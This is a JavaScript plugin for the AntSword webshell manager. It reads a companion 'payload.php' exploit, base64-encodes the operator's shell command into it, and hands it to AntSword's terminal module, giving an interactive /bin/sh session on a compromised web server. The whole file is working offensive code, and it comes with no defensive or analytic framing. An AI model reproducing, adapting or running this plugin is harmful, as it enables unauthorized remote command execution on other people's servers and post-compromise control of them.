'use strict';

const fs = require('fs');
const path = require('path');

class Plugin {
  constructor(opt) {
    let self = this;
    self.opt = opt;
    self.core = new antSword['core'][opt['type']](opt);
    
    let payloadPath = path.join(__dirname, 'payload.php');
    let payloadStr = fs.readFileSync(payloadPath).toString();

    // Use antSword's built-in terminal module for a native CLI experience
    new antSword.module.terminal(opt, {
      exec: (arg = { bin: '/bin/sh', cmd: '' }) => {
        let cmd = arg['cmd'];
        if (!cmd) cmd = 'id';
        
        // We do NOT use ob_start/ob_end_clean because AntSword has its own output 
        // boundary strings (e.g. random markers) printed before our code executes.
        // If we clean the buffer, we destroy AntSword's markers and it shows blank!
        let code = payloadStr.replace(
          `(new Exploit)->run($_POST["cmd"] ?? "id");`,
          `(new Exploit)->run(base64_decode("${Buffer.from(cmd).toString('base64')}"));`
        );
        
        return {
          _: code
        };
      }
    });
  }
}

module.exports = Plugin;
